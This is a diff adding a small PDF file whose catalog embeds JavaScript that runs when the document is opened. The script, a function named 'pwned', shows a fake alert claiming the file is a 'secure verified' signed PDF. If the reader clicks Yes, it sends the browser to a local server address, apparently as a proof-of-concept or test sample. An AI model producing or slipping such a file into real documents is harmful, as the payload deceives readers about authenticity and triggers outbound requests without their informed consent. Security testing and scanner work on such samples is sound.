@@ -1,0 +1,65 @@
+%PDF-1.7
+4 0 obj
+<<
+/Length 0
+>>
+stream
+
+endstream endobj
+5 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/Resources 3 0 R
+/Contents 4 0 R
+/MediaBox [ 0 0 612 792 ]
+
+>>
+ endobj
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+/OpenAction [ 5 0 R /Fit ]
+  /Names << % the Javascript entry
+    /JavaScript <<
+      /Names [
+        (EmbeddedJS)
+        <<
+          /S /JavaScript
+          /JS (
+            function pwned\(\)\r\n{\r\nvar fakeSigned = app.alert\({\r\n    cMsg: "This is a secure verified PDF file.",\r\n    cTitle: "Signed PDF file",\r\n    nIcon: 2, nType: 2\r\n    }\);\r\n    if \( fakeSigned == 4 \) this.getURL\("http://127.0.0.1:5000", false\);\r\n}\r\npwned\(\)
+          )
+        >>
+      ]
+    >>
+  >> % end of the javascript entry
+>>
+ endobj
+2 0 obj
+<<
+/Type /Pages
+/Count 1
+/Kids [ 5 0 R ]
+
+>>
+ endobj
+3 0 obj
+<<
+>>
+ endobj
+xref
+0 6
+0000000000 65535 f 
+0000000166 00000 n 
+0000000244 00000 n 
+0000000305 00000 n 
+0000000009 00000 n 
+0000000058 00000 n 
+trailer <<
+/Size 6
+/Root 1 0 R
+>>
+startxref
+327
+%%EOF
